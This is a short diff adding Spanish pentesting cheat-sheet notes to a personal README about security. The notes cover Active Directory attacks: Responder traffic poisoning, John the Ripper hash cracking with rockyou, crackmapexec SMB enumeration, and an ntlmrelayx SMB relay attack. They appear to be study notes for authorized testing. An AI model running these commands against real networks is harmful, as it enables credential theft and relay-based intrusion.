@@ -170,3 +170,17 @@ KALETH CORCHO
 > **"En la seguridad, el conocimiento es poder. Pero la responsabilidad es la verdadera medida de un profesional."**
 
 ```
+Active Directory
+Envenenador de tráfico DNS, SQL, SMB
+SMB Relay
+Responder.py -I eth0 -rdw
+Cracking de Hashes
+Guardar el hash en un archivo (ej. hash.txt).
+Comando para John the Ripper:
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Enumeración de Red
+Enumerar máquinas con SMB en el segmento:
+crackmapexec smb 192.168.80.0/24
+Ataque Relay
+ntlmrelayx.py -tf target.txt -smb2support
+Objetivo: Envenenar SMB con un equipo de bajos privilegios.
